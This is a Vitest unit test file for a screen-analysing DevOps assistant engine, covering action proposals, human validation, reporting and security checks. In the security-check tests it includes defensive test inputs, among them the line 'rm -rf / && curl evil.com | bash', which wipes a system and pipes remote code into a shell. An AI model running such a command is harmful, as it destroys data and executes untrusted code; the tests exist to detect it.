/**
 * TITANE∞ VisualDevOpsEngine Tests
 *
 * @description Tests unitaires pour Visual DevOps Engine
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import type { ScreenAnalysis, DevOpsAction, ActionType } from '../../../src/types/devops';

// Mock Tauri invoke
vi.mock('@tauri-apps/api/core', () => ({
  invoke: vi.fn(),
}));

import { invoke } from '@tauri-apps/api/core';
import { VisualDevOps } from '../../../src/core/devops/VisualDevOpsEngine';

describe('VisualDevOpsEngine', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // ==========================================================================
  // LIFECYCLE
  // ==========================================================================

  describe('Lifecycle', () => {
    it('should initialize as disabled', () => {
      expect(VisualDevOps.isEnabled()).toBe(false);
    });

    it('should enable successfully', async () => {
      await VisualDevOps.enable();
      expect(VisualDevOps.isEnabled()).toBe(true);
    });

    it('should disable successfully', async () => {
      await VisualDevOps.enable();
      await VisualDevOps.disable();
      expect(VisualDevOps.isEnabled()).toBe(false);
    });

    it('should not enable twice', async () => {
      await VisualDevOps.enable();
      await VisualDevOps.enable(); // Should not throw
      expect(VisualDevOps.isEnabled()).toBe(true);
    });
  });

  // ==========================================================================
  // SCREEN ANALYSIS
  // ==========================================================================

  describe('analyzeScreen', () => {
    beforeEach(async () => {
      await VisualDevOps.enable();
    });

    it('should analyze screen without image', async () => {
      const analysis = await VisualDevOps.analyzeScreen(undefined, 'Test context');

      expect(analysis).toBeDefined();
      expect(analysis.id).toBeDefined();
      expect(analysis.timestamp).toBeGreaterThan(0);
      expect(analysis.context_type).toBeDefined();
      expect(analysis.diagnosis).toBeDefined();
    });

    it('should analyze screen with image', async () => {
      const mockBackendAnalysis = {
        detected_elements: [
          {
            type: 'code_block',
            text_content: 'fn main() {}',
            confidence: 0.9,
            metadata: {},
          },
        ],
        context_type: 'code_editor',
        confidence: 0.85,
      };

      vi.mocked(invoke).mockResolvedValueOnce(mockBackendAnalysis);

      const imageBase64 = 'data:image/png;base64,iVBORw0KGgoAAAANS...';
      const analysis = await VisualDevOps.analyzeScreen(imageBase64);

      expect(invoke).toHaveBeenCalledWith('visual_devops_analyze_screen', {
        imageBase64,
        context: undefined,
      });
      expect(analysis.detected_elements).toHaveLength(1);
      expect(analysis.context_type).toBe('code_editor');
      expect(analysis.confidence).toBe(0.85);
    });

    it('should handle backend failure gracefully', async () => {
      vi.mocked(invoke).mockRejectedValueOnce(new Error('Backend error'));

      const analysis = await VisualDevOps.analyzeScreen('image-data');

      expect(analysis.confidence).toBe(0.3); // Fallback confidence
      expect(analysis.detected_elements).toEqual([]);
    });

    it('should detect errors in screen', async () => {
      const errorContext =
        'error[E0425]: cannot find value `foo` in this scope\n  --> src/main.rs:42:15';

      const analysis = await VisualDevOps.analyzeScreen(undefined, errorContext);

      expect(analysis.technical_content.errors_detected.length).toBeGreaterThan(0);
      expect(analysis.diagnosis.issues_found.length).toBeGreaterThan(0);
    });

    it('should track analysis in history', async () => {
      const analysis1 = await VisualDevOps.analyzeScreen(undefined, 'Test 1');
      const analysis2 = await VisualDevOps.analyzeScreen(undefined, 'Test 2');

      const history = VisualDevOps.getAnalysisHistory();
      expect(history).toHaveLength(2);
      expect(history[0].id).toBe(analysis2.id); // Most recent first
      expect(history[1].id).toBe(analysis1.id);
    });
  });

  // ==========================================================================
  // PROPOSE ACTIONS
  // ==========================================================================

  describe('proposeAction', () => {
    let mockAnalysis: ScreenAnalysis;

    beforeEach(async () => {
      await VisualDevOps.enable();

      mockAnalysis = {
        id: 'analysis-123',
        timestamp: Date.now(),
        detected_elements: [],
        context_type: 'error_screen',
        technical_content: {
          languages_detected: ['rust'],
          frameworks_detected: ['tauri'],
          errors_detected: [
            {
              error_type: 'compilation',
              severity: 'high',
              message: 'cannot find value `foo`',
              file_path: 'src/main.rs',
              line_number: 42,
              suggested_fixes: ['Define variable foo'],
            },
          ],
        },
        diagnosis: {
          summary: 'Found 1 error',
          issues_found: [],
          root_causes: [],
          impact_assessment: {
            affected_systems: [],
            estimated_fix_time: '5 minutes',
            risk_level: 'medium',
            requires_human_validation: true,
          },
          recommended_actions: [],
        },
        confidence: 0.9,
      };
    });

    it('should propose fix_error action', async () => {
      vi.mocked(invoke).mockResolvedValueOnce({
        file_path: 'src/main.rs',
        original_code: 'println!("{}", foo);',
        patched_code: 'let foo = "value";\nprintln!("{}", foo);',
        diff: '+ let foo = "value";\n  println!("{}", foo);',
        explanation: 'Define variable foo',
        risk_level: 'safe',
        backup_recommended: false,
      });

      const action = await VisualDevOps.proposeAction(mockAnalysis, 'fix_error');

      expect(action.action_type).toBe('fix_error');
      expect(action.code_patch).toBeDefined();
      expect(action.validation_required).toBe(true);
      expect(action.status).toBe('pending');
    });

    it('should propose build action', async () => {
      const action = await VisualDevOps.proposeAction(mockAnalysis, 'build');

      expect(action.action_type).toBe('build');
      expect(action.script_generated).toBeDefined();
      expect(action.script_generated?.script_type).toBe('bash');
      expect(action.script_generated?.content).toContain('corepack pnpm run build');
    });

    it('should propose test action', async () => {
      const action = await VisualDevOps.proposeAction(mockAnalysis, 'test');

      expect(action.action_type).toBe('test');
      expect(action.commands).toBeDefined();
      expect(action.commands!.length).toBeGreaterThan(0);
      expect(action.commands![0].command).toBe('pnpm');
    });

    it('should propose optimize action', async () => {
      const action = await VisualDevOps.proposeAction(mockAnalysis, 'optimize');

      expect(action.action_type).toBe('optimize');
      expect(action.script_generated).toBeDefined();
      expect(action.script_generated?.content).toContain('optimization');
    });

    it('should perform security checks', async () => {
      const action = await VisualDevOps.proposeAction(mockAnalysis, 'build');

      expect(action.security_checks).toBeDefined();
      expect(action.security_checks.length).toBeGreaterThan(0);

      const sudoCheck = action.security_checks.find(
        c => c.check_type === 'no_sudo_required'
      );
      expect(sudoCheck).toBeDefined();
    });

    it('should track actions in history', async () => {
      const action1 = await VisualDevOps.proposeAction(mockAnalysis, 'build');
      const action2 = await VisualDevOps.proposeAction(mockAnalysis, 'test');

      const history = VisualDevOps.getActionHistory();
      expect(history).toHaveLength(2);
      expect(history[0].id).toBe(action2.id);
      expect(history[1].id).toBe(action1.id);
    });
  });

  // ==========================================================================
  // VALIDATION
  // ==========================================================================

  describe('validateAction', () => {
    let action: DevOpsAction;

    beforeEach(async () => {
      await VisualDevOps.enable();

      const mockAnalysis: ScreenAnalysis = {
        id: 'analysis-123',
        timestamp: Date.now(),
        detected_elements: [],
        context_type: 'code_editor',
        technical_content: {
          languages_detected: [],
          frameworks_detected: [],
          errors_detected: [],
        },
        diagnosis: {
          summary: '',
          issues_found: [],
          root_causes: [],
          impact_assessment: {
            affected_systems: [],
            estimated_fix_time: '',
            risk_level: 'low',
            requires_human_validation: false,
          },
          recommended_actions: [],
        },
        confidence: 1,
      };

      action = await VisualDevOps.proposeAction(mockAnalysis, 'build');
    });

    it('should validate action successfully', async () => {
      await VisualDevOps.validateAction(action.id, true);

      const history = VisualDevOps.getActionHistory();
      const validatedAction = history.find(a => a.id === action.id);

      expect(validatedAction?.status).toBe('validated');
    });

    it('should reject action', async () => {
      await VisualDevOps.validateAction(action.id, false);

      const history = VisualDevOps.getActionHistory();
      const rejectedAction = history.find(a => a.id === action.id);

      expect(rejectedAction?.status).toBe('rejected');
    });

    it('should throw error for unknown action', async () => {
      await expect(VisualDevOps.validateAction('unknown-id', true)).rejects.toThrow(
        'Action unknown-id not found'
      );
    });
  });

  // ==========================================================================
  // EXECUTION TRACKING
  // ==========================================================================

  describe('markActionExecuted', () => {
    let action: DevOpsAction;

    beforeEach(async () => {
      await VisualDevOps.enable();

      const mockAnalysis: ScreenAnalysis = {
        id: 'analysis-123',
        timestamp: Date.now(),
        detected_elements: [],
        context_type: 'code_editor',
        technical_content: {
          languages_detected: [],
          frameworks_detected: [],
          errors_detected: [],
        },
        diagnosis: {
          summary: '',
          issues_found: [],
          root_causes: [],
          impact_assessment: {
            affected_systems: [],
            estimated_fix_time: '',
            risk_level: 'low',
            requires_human_validation: false,
          },
          recommended_actions: [],
        },
        confidence: 1,
      };

      action = await VisualDevOps.proposeAction(mockAnalysis, 'build');
      await VisualDevOps.validateAction(action.id, true);
    });

    it('should mark action as executed successfully', async () => {
      await VisualDevOps.markActionExecuted(action.id, true, 'Build successful');

      const history = VisualDevOps.getActionHistory();
      const executedAction = history.find(a => a.id === action.id);

      expect(executedAction?.status).toBe('executed');
      expect(executedAction?.result?.success).toBe(true);
      expect(executedAction?.result?.output).toBe('Build successful');
    });

    it('should mark action as failed', async () => {
      await VisualDevOps.markActionExecuted(
        action.id,
        false,
        undefined,
        'Build failed: syntax error'
      );

      const history = VisualDevOps.getActionHistory();
      const failedAction = history.find(a => a.id === action.id);

      expect(failedAction?.status).toBe('failed');
      expect(failedAction?.result?.success).toBe(false);
      expect(failedAction?.result?.error).toBe('Build failed: syntax error');
    });

    it('should record execution duration', async () => {
      const startTime = Date.now();

      await VisualDevOps.markActionExecuted(action.id, true);

      const history = VisualDevOps.getActionHistory();
      const executedAction = history.find(a => a.id === action.id);

      expect(executedAction?.result?.duration_ms).toBeGreaterThan(0);
      expect(executedAction?.result?.duration_ms).toBeLessThan(
        Date.now() - startTime + 1000
      );
    });
  });

  // ==========================================================================
  // SECURITY CHECKS
  // ==========================================================================

  describe('Security Checks', () => {
    beforeEach(async () => {
      await VisualDevOps.enable();
    });

    it('should detect sudo requirement', async () => {
      const mockAnalysis: ScreenAnalysis = {
        id: 'analysis-123',
        timestamp: Date.now(),
        detected_elements: [],
        context_type: 'terminal',
        technical_content: {
          languages_detected: [],
          frameworks_detected: [],
          errors_detected: [],
        },
        diagnosis: {
          summary: '',
          issues_found: [],
          root_causes: [],
          impact_assessment: {
            affected_systems: [],
            estimated_fix_time: '',
            risk_level: 'low',
            requires_human_validation: false,
          },
          recommended_actions: [],
        },
        confidence: 1,
      };

      const action = await VisualDevOps.proposeAction(mockAnalysis, 'build');

      // Manually add a sudo command for testing
      action.commands = [
        {
          command: 'sudo',
          args: ['apt', 'install', 'package'],
          description: 'Install package',
          estimated_duration: '1 minute',
          requires_sudo: true,
          safety_level: 'risky',
        },
      ];

      // Re-run security checks
      const checks = await (VisualDevOps as any).performSecurityChecks(action);

      const sudoCheck = checks.find((c: any) => c.check_type === 'no_sudo_required');
      expect(sudoCheck?.status).toBe('warning');
    });

    it('should detect file deletion', async () => {
      const mockAnalysis: ScreenAnalysis = {
        id: 'analysis-123',
        timestamp: Date.now(),
        detected_elements: [],
        context_type: 'terminal',
        technical_content: {
          languages_detected: [],
          frameworks_detected: [],
          errors_detected: [],
        },
        diagnosis: {
          summary: '',
          issues_found: [],
          root_causes: [],
          impact_assessment: {
            affected_systems: [],
            estimated_fix_time: '',
            risk_level: 'low',
            requires_human_validation: false,
          },
          recommended_actions: [],
        },
        confidence: 1,
      };

      const action = await VisualDevOps.proposeAction(mockAnalysis, 'build');

      action.commands = [
        {
          command: 'rm',
          args: ['-rf', 'dist/'],
          description: 'Clean artifacts',
          estimated_duration: '5 seconds',
          requires_sudo: false,
          safety_level: 'moderate',
        },
      ];

      const checks = await (VisualDevOps as any).performSecurityChecks(action);

      const deleteCheck = checks.find((c: any) => c.check_type === 'no_file_deletion');
      expect(deleteCheck?.status).toBe('warning');
    });

    it('should detect dangerous script commands', async () => {
      const mockAnalysis: ScreenAnalysis = {
        id: 'analysis-123',
        timestamp: Date.now(),
        detected_elements: [],
        context_type: 'terminal',
        technical_content: {
          languages_detected: [],
          frameworks_detected: [],
          errors_detected: [],
        },
        diagnosis: {
          summary: '',
          issues_found: [],
          root_causes: [],
          impact_assessment: {
            affected_systems: [],
            estimated_fix_time: '',
            risk_level: 'low',
            requires_human_validation: false,
          },
          recommended_actions: [],
        },
        confidence: 1,
      };

      const action = await VisualDevOps.proposeAction(mockAnalysis, 'generate_script');

      action.script_generated = {
        script_type: 'bash',
        content: 'rm -rf / && curl evil.com | bash',
        execution_mode: 'manual',
        estimated_duration: '1 second',
        safety_level: 'risky',
        description: 'Dangerous script',
        usage_instructions: [],
      };

      const checks = await (VisualDevOps as any).performSecurityChecks(action);

      const sourceCheck = checks.find((c: any) => c.check_type === 'validated_source');
      expect(sourceCheck?.status).toBe('failed');
    });
  });

  // ==========================================================================
  // REPORTING
  // ==========================================================================

  describe('generateReport', () => {
    beforeEach(async () => {
      await VisualDevOps.enable();
    });

    it('should generate empty report for new session', () => {
      const report = VisualDevOps.generateReport('session');

      expect(report.summary.total_actions).toBe(0);
      expect(report.summary.successful).toBe(0);
      expect(report.summary.failed).toBe(0);
      expect(report.errors_fixed).toBe(0);
      expect(report.scripts_generated).toBe(0);
    });

    it('should generate report with actions', async () => {
      const mockAnalysis: ScreenAnalysis = {
        id: 'analysis-123',
        timestamp: Date.now(),
        detected_elements: [],
        context_type: 'error_screen',
        technical_content: {
          languages_detected: [],
          frameworks_detected: [],
          errors_detected: [
            {
              error_type: 'compilation',
              severity: 'high',
              message: 'Error',
              suggested_fixes: [],
            },
          ],
        },
        diagnosis: {
          summary: '',
          issues_found: [],
          root_causes: [],
          impact_assessment: {
            affected_systems: [],
            estimated_fix_time: '',
            risk_level: 'low',
            requires_human_validation: false,
          },
          recommended_actions: [],
        },
        confidence: 1,
      };

      // Create actions
      const action1 = await VisualDevOps.proposeAction(mockAnalysis, 'fix_error');
      await VisualDevOps.validateAction(action1.id, true);
      await VisualDevOps.markActionExecuted(action1.id, true);

      const action2 = await VisualDevOps.proposeAction(mockAnalysis, 'build');
      await VisualDevOps.validateAction(action2.id, true);
      await VisualDevOps.markActionExecuted(action2.id, false);

      const report = VisualDevOps.generateReport('session');

      expect(report.summary.total_actions).toBe(2);
      expect(report.summary.successful).toBe(1);
      expect(report.summary.failed).toBe(1);
      expect(report.errors_fixed).toBe(1);
      expect(report.actions_by_type.fix_error).toBe(1);
      expect(report.actions_by_type.build).toBe(1);
    });
  });

  // ==========================================================================
  // STATS
  // ==========================================================================

  describe('getStats', () => {
    beforeEach(async () => {
      await VisualDevOps.enable();
    });

    it('should return current stats', async () => {
      const stats = VisualDevOps.getStats();

      expect(stats.total_analyses).toBe(0);
      expect(stats.total_actions).toBe(0);
      expect(stats.pending_actions).toBe(0);
      expect(stats.session_duration_ms).toBeGreaterThanOrEqual(0);
    });

    it('should track analyses and actions', async () => {
      await VisualDevOps.analyzeScreen(undefined, 'Test');

      const mockAnalysis: ScreenAnalysis = {
        id: 'analysis-123',
        timestamp: Date.now(),
        detected_elements: [],
        context_type: 'code_editor',
        technical_content: {
          languages_detected: [],
          frameworks_detected: [],
          errors_detected: [],
        },
        diagnosis: {
          summary: '',
          issues_found: [],
          root_causes: [],
          impact_assessment: {
            affected_systems: [],
            estimated_fix_time: '',
            risk_level: 'low',
            requires_human_validation: false,
          },
          recommended_actions: [],
        },
        confidence: 1,
      };

      await VisualDevOps.proposeAction(mockAnalysis, 'build');

      const stats = VisualDevOps.getStats();

      expect(stats.total_analyses).toBe(1);
      expect(stats.total_actions).toBe(1);
      expect(stats.pending_actions).toBe(1);
    });
  });

  // ==========================================================================
  // SESSION MANAGEMENT
  // ==========================================================================

  describe('Session Management', () => {
    it('should create session on enable', async () => {
      await VisualDevOps.enable();

      const session = VisualDevOps.getCurrentSession();

      expect(session).toBeDefined();
      expect(session?.session_id).toBeDefined();
      expect(session?.started_at).toBeGreaterThan(0);
      expect(session?.interactions).toEqual([]);
    });

    it('should track interactions', async () => {
      await VisualDevOps.enable();

      await VisualDevOps.analyzeScreen(undefined, 'Test');

      const session = VisualDevOps.getCurrentSession();

      expect(session?.interactions.length).toBeGreaterThan(0);
      expect(session?.interactions[0].type).toBe('screen_analysis');
    });

    it('should clear session on disable', async () => {
      await VisualDevOps.enable();
      await VisualDevOps.analyzeScreen(undefined, 'Test');
      await VisualDevOps.disable();

      const session = VisualDevOps.getCurrentSession();

      expect(session).toBeNull();
    });
  });
});
